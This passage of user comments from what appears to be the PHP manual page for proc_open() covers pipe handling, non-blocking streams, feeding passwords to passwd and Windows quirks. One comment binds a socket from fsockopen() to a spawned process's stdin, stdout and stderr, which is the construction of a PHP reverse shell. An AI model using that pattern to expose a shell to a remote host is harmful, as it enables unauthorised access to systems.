&nbsp;&nbsp;&nbsp; </span><span class="default">$cmd </span><span class="keyword">= </span><span class="default">sprintf</span><span class="keyword">(</span><span class="string">'cd %s &amp;&amp; %s'</span><span class="keyword">, </span><span class="default">escapeshellarg</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">$cmd</span><span class="keyword">)), </span><span class="default">basename</span><span class="keyword">(</span><span class="default">$cmd</span><span class="keyword">));<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="118111""></a>
  <div class="note">
   <strong class="user">aaronw at catalyst dot net dot nz</strong>
   <a href="#118111" class="date">05-Oct-2015 11:16</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you have a CLI script that prompts you for a password via STDIN, and you need to run it from PHP, proc_open() can get you there. It's better than doing "echo $password | command.sh", because then your password will be visible in the process list to any user who runs "ps". Alternately you could print the password to a file and use cat: "cat passwordfile.txt | command.sh", but then you've got to manage that file in a secure manner.<br />
<br />
If your command will always prompt you for responses in a specific order, then proc_open() is quite simple to use and you don't really have to worry about blocking &amp; non-blocking streams. For instance, to run the "passwd" command:<br />
<br />
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),<br />
&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">)<br />
);<br />
</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'/usr/bin/passwd ' </span><span class="keyword">. </span><span class="default">escapeshellarg</span><span class="keyword">(</span><span class="default">$username</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$descriptorspec</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$pipes<br />
</span><span class="keyword">);<br />
<br />
</span><span class="comment">// It wil prompt for existing password, then new password twice.<br />
// You don't need to escapeshellarg() these, but you should whitelist<br />
// them to guard against control characters, perhaps by using ctype_print()<br />
</span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">"</span><span class="default">$oldpassword</span><span class="string">\n</span><span class="default">$newpassword</span><span class="string">\n</span><span class="default">$newpassword</span><span class="string">\n"</span><span class="keyword">);<br />
<br />
</span><span class="comment">// Read the responses if you want to look at them<br />
</span><span class="default">$stdout </span><span class="keyword">= </span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">);<br />
</span><span class="default">$stderr </span><span class="keyword">= </span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">);<br />
<br />
</span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
</span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
</span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);<br />
</span><span class="default">$exit_status </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);<br />
<br />
</span><span class="comment">// It returns 0 on successful password change<br />
</span><span class="default">$success </span><span class="keyword">= (</span><span class="default">$exit_status </span><span class="keyword">=== </span><span class="default">0</span><span class="keyword">);<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="117912""></a>
  <div class="note">
   <strong class="user">stevebaldwin21 at googlemail dot com</strong>
   <a href="#117912" class="date">31-Aug-2015 06:32</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
For those who are finding that using the $cwd and $env options cause proc_open to fail (windows). You will need to pass all other server environment variables; <br />
<br />
$descriptorSpec = array(<br />
&nbsp;&nbsp; &nbsp; &nbsp; 0 =&gt; array("pipe", "r"),<br />
&nbsp;&nbsp; &nbsp; &nbsp; 1 =&gt; array("pipe", "w"),&nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; );<br />
<br />
proc_open(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; "C:\\Windows\\System32\\PING.exe localhost, <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; $descriptorSpec , <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; $pipes, <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; "C:\\Windows\\System32", <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; array($_SERVER)<br />
);</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="117531""></a>
  <div class="note">
   <strong class="user">vanyazin at gmail dot com</strong>
   <a href="#117531" class="date">25-Jun-2015 04:47</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you want to use proc_open() function with socket streams, you can open connection with help of fsockopen() function and then just put handlers into array of io descriptors:<br />
<br />
<span class="default">&lt;?php<br />
<br />
&nbsp;&nbsp;&nbsp; $fh </span><span class="keyword">= </span><span class="default">fsockopen</span><span class="keyword">(</span><span class="default">$address</span><span class="keyword">, </span><span class="default">$port</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$descriptors </span><span class="keyword">= [<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$fh</span><span class="keyword">,&nbsp;&nbsp; </span><span class="comment">// stdin<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$fh</span><span class="keyword">,&nbsp;&nbsp; </span><span class="comment">// stdout<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$fh</span><span class="keyword">,&nbsp;&nbsp; </span><span class="comment">// stderr<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">];<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$proc </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="default">$cmd</span><span class="keyword">, </span><span class="default">$descriptors</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">);</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="117107""></a>
  <div class="note">
   <strong class="user">hablutzel1 at gmail dot com</strong>
   <a href="#117107" class="date">15-Apr-2015 05:26</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Note that the usage of "bypass_shell" in Windows allows you to pass a command of length around ~32767 characters. If you do not use it, your limit is around ~8191 characters only. <br />
<br />
See https://support.microsoft.com/en-us/kb/830473.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="113319""></a>
  <div class="note">
   <strong class="user">exel at example dot com</strong>
   <a href="#113319" class="date">26-Sep-2013 10:05</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
pipe communications may break brains off. i want to share some stuff to avoid such result.<br />
for proper control of the communications through the "in" and "out" pipes of the opened sub-process, remember to set both of them into non-blocking mode and especially notice that fwrite may return (int)0 but it's not an error, just process might not except input at that moment. <br />
<br />
so, let us consider an example of decoding gz-encoded file by using funzip as sub-process: (this is not the final version, just to show important things)<br />
<br />
<span class="default">&lt;?php<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// make gz file<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$fd</span><span class="keyword">=</span><span class="default">fopen</span><span class="keyword">(</span><span class="string">"/tmp/testPipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; for(</span><span class="default">$i</span><span class="keyword">=</span><span class="default">0</span><span class="keyword">;</span><span class="default">$i</span><span class="keyword">&lt;</span><span class="default">100000</span><span class="keyword">;</span><span class="default">$i</span><span class="keyword">++)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$fd</span><span class="keyword">, </span><span class="default">md5</span><span class="keyword">(</span><span class="default">$i</span><span class="keyword">).</span><span class="string">"\n"</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$fd</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if(</span><span class="default">is_file</span><span class="keyword">(</span><span class="string">"/tmp/testPipe.gz"</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">unlink</span><span class="keyword">(</span><span class="string">"/tmp/testPipe.gz"</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">system</span><span class="keyword">(</span><span class="string">"gzip /tmp/testPipe"</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// open process<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$pipesDescr</span><span class="keyword">=array(<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"file"</span><span class="keyword">, </span><span class="string">"/tmp/testPipe.log"</span><span class="keyword">, </span><span class="string">"a"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; );<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$process</span><span class="keyword">=</span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">"zcat"</span><span class="keyword">, </span><span class="default">$pipesDescr</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if(!</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) throw new </span><span class="default">Exception</span><span class="keyword">(</span><span class="string">"popen error"</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// set both pipes non-blocking<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="default">0</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">0</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">////////////////////////////////////////////////////////////////////<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$text</span><span class="keyword">=</span><span class="string">""</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$fd</span><span class="keyword">=</span><span class="default">fopen</span><span class="keyword">(</span><span class="string">"/tmp/testPipe.gz"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; while(!</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$fd</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$str</span><span class="keyword">=</span><span class="default">fread</span><span class="keyword">(</span><span class="default">$fd</span><span class="keyword">, </span><span class="default">16384</span><span class="keyword">*</span><span class="default">4</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$try</span><span class="keyword">=</span><span class="default">3</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; while(</span><span class="default">$str</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$len</span><span class="keyword">=</span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="default">$str</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; while(</span><span class="default">$s</span><span class="keyword">=</span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">16384</span><span class="keyword">*</span><span class="default">4</span><span class="keyword">))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$text</span><span class="keyword">.=</span><span class="default">$s</span><span class="keyword">;<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if(!</span><span class="default">$len</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// if yo remove this paused retries, process may fail<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">usleep</span><span class="keyword">(</span><span class="default">200000</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$try</span><span class="keyword">--;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if(!</span><span class="default">$try</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; throw new </span><span class="default">Exception</span><span class="keyword">(</span><span class="string">"fwrite error"</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$str</span><span class="keyword">=</span><span class="default">substr</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">, </span><span class="default">$len</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">).</span><span class="string">"\n"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$fd</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// reading the rest of output stream<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">1</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; while(!</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]))<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$s</span><span class="keyword">=</span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">16384</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$text</span><span class="keyword">.=</span><span class="default">$s</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">).</span><span class="string">" / 3 300 000\n"</span><span class="keyword">;<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="111858""></a>
  <div class="note">
   <strong class="user">mcuadros at gmail dot com</strong>
   <a href="#111858" class="date">05-Apr-2013 10:56</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
This is a example of how run a command using as output the TTY, just like crontab -e or git commit does.<br />
<br />
<span class="default">&lt;?php<br />
<br />
$descriptors </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; array(</span><span class="string">'file'</span><span class="keyword">, </span><span class="string">'/dev/tty'</span><span class="keyword">, </span><span class="string">'r'</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; array(</span><span class="string">'file'</span><span class="keyword">, </span><span class="string">'/dev/tty'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; array(</span><span class="string">'file'</span><span class="keyword">, </span><span class="string">'/dev/tty'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">)<br />
);<br />
<br />
</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">'vim'</span><span class="keyword">, </span><span class="default">$descriptors</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">);</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="110993""></a>
  <div class="note">
   <strong class="user">michael dot gross at NOSPAM dot flexlogic dot at</strong>
   <a href="#110993" class="date">03-Jan-2013 08:33</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Please note that if you plan to spawn multiple processes you have to save all the results in different variables (in an array for example). If you for example would call $proc = proc_open..... multiple times the script will block after the second time until the child process exits (proc_close is called implicitly).</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="109951""></a>
  <div class="note">
   <strong class="user">bilge at boontex dot com</strong>
   <a href="#109951" class="date">05-Sep-2012 02:56</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
$cmd can actually be multiple commands by separating each command with a newline. However, due to this it is not possible to split up one very long command over multiple lines, even when using "\\\n" syntax.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="107856""></a>
  <div class="note">
   <strong class="user">devel at romanr dot info</strong>
   <a href="#107856" class="date">10-Mar-2012 08:04</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
The call works as should. No bugs.<br />
But. In most cases you won't able to work with pipes in blocking mode.<br />
When your output pipe (process' input one, $pipes[0]) is blocking, there is a case, when you and the process are blocked on output.<br />
When your input pipe (process' output one, $pipes[1]) is blocking, there is a case, when you and the process both are blocked on own input.<br />
So you should switch pipes into NONBLOCKING mode (stream_set_blocking).<br />
Then, there is a case, when you're not able to read anything (fread($pipes[1],...) == "") either write (fwrite($pipes[0],...) == 0). In this case, you better check the process is alive (proc_get_status) and if it still is - wait for some time (stream_select). The situation is truly asynchronous, the process may be busy working, processing your data.<br />
Using shell effectively makes not possible to know whether the command is exists - proc_open always returns valid resource. You may even write some data into it (into shell, actually). But eventually it will terminate, so check the process status regularly.<br />
I would advice not using mkfifo-pipes, because filesystem fifo-pipe (mkfifo) blocks open/fopen call (!!!) until somebody opens other side (unix-related behavior). In case the pipe is opened not by shell and the command is crashed or is not exists you will be blocked forever.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="106502""></a>
  <div class="note">
   <strong class="user">toby at globaloptima dot co dot uk</strong>
   <a href="#106502" class="date">14-Nov-2011 01:38</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If script A is spawning script B and script B pushes a lot of data to stdout without script A consuming that data, script B is likely to hang but the result of proc_get_status on that process seems to continue to indicate it's running.<br />
<br />
So either don't write to stdout i the spawned process (I write to log files instead now) or try to read in the stdout in a non-blocking way if your script A is spawning many instances of script B, I couldn't get this second option to work sadly.<br />
<br />
PHP 5.3.8 CLI on Windows 7 64.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="102239""></a>
  <div class="note">
   <strong class="user">mattis at xait dot no</strong>
   <a href="#102239" class="date">03-Feb-2011 07:41</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you are, like me, tired of the buggy way proc_open handles streams and exit codes; this example demonstrate the power of pcntl, posix and some simple output redirection:<br />
<br />
<span class="default">&lt;?php<br />
$outpipe </span><span class="keyword">= </span><span class="string">'/tmp/outpipe'</span><span class="keyword">;<br />
</span><span class="default">$inpipe </span><span class="keyword">= </span><span class="string">'/tmp/inpipe'</span><span class="keyword">;<br />
</span><span class="default">posix_mkfifo</span><span class="keyword">(</span><span class="default">$inpipe</span><span class="keyword">, </span><span class="default">0600</span><span class="keyword">);<br />
</span><span class="default">posix_mkfifo</span><span class="keyword">(</span><span class="default">$outpipe</span><span class="keyword">, </span><span class="default">0600</span><span class="keyword">);<br />
<br />
</span><span class="default">$pid </span><span class="keyword">= </span><span class="default">pcntl_fork</span><span class="keyword">();<br />
<br />
</span><span class="comment">//parent<br />
</span><span class="keyword">if(</span><span class="default">$pid</span><span class="keyword">) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$in </span><span class="keyword">= </span><span class="default">fopen</span><span class="keyword">(</span><span class="default">$inpipe</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$in</span><span class="keyword">, </span><span class="string">"A message for the inpipe reader\n"</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$in</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$out </span><span class="keyword">= </span><span class="default">fopen</span><span class="keyword">(</span><span class="default">$outpipe</span><span class="keyword">, </span><span class="string">'r'</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; while(!</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$out</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="string">"From out pipe: " </span><span class="keyword">. </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$out</span><span class="keyword">) . </span><span class="default">PHP_EOL</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$out</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">pcntl_waitpid</span><span class="keyword">(</span><span class="default">$pid</span><span class="keyword">, </span><span class="default">$status</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if(</span><span class="default">pcntl_wifexited</span><span class="keyword">(</span><span class="default">$status</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; echo </span><span class="string">"Reliable exit code: " </span><span class="keyword">. </span><span class="default">pcntl_wexitstatus</span><span class="keyword">(</span><span class="default">$status</span><span class="keyword">) . </span><span class="default">PHP_EOL</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="default">unlink</span><span class="keyword">(</span><span class="default">$outpipe</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">unlink</span><span class="keyword">(</span><span class="default">$inpipe</span><span class="keyword">);<br />
}<br />
<br />
</span><span class="comment">//child<br />
</span><span class="keyword">else {<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">//parent<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">if(</span><span class="default">$pid </span><span class="keyword">= </span><span class="default">pcntl_fork</span><span class="keyword">()) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">pcntl_exec</span><span class="keyword">(</span><span class="string">'/bin/sh'</span><span class="keyword">, array(</span><span class="string">'-c'</span><span class="keyword">, </span><span class="string">"printf 'A message for the outpipe reader' &gt; </span><span class="default">$outpipe</span><span class="string"> 2&gt;&amp;1 &amp;&amp; exit 12"</span><span class="keyword">));<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">//child<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">else {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">pcntl_exec</span><span class="keyword">(</span><span class="string">'/bin/sh'</span><span class="keyword">, array(</span><span class="string">'-c'</span><span class="keyword">, </span><span class="string">"printf 'From in pipe: '; cat </span><span class="default">$inpipe</span><span class="string">"</span><span class="keyword">));<br />
&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp; <br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
Output:<br />
<br />
From in pipe: A message for the inpipe reader<br />
From out pipe: A message for the outpipe reader<br />
Reliable exit code: 12</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="97379""></a>
  <div class="note">
   <strong class="user">php at keith tyler dot com</strong>
   <a href="#97379" class="date">16-Apr-2010 11:32</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Interestingly enough, it seems you actually have to store the return value in order for your streams to exist. You can't throw it away.<br />
<br />
In other words, this works:<br />
<br />
<span class="default">&lt;?php<br />
$proc</span><span class="keyword">=</span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">"echo foo"</span><span class="keyword">,<br />
&nbsp; array(<br />
&nbsp;&nbsp;&nbsp; array(</span><span class="string">"pipe"</span><span class="keyword">,</span><span class="string">"r"</span><span class="keyword">),<br />
&nbsp;&nbsp;&nbsp; array(</span><span class="string">"pipe"</span><span class="keyword">,</span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp;&nbsp; array(</span><span class="string">"pipe"</span><span class="keyword">,</span><span class="string">"w"</span><span class="keyword">)<br />
&nbsp; ),<br />
&nbsp; </span><span class="default">$pipes</span><span class="keyword">);<br />
print </span><span class="default">stream_get_contents</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
</span><span class="default">?&gt;<br />
</span><br />
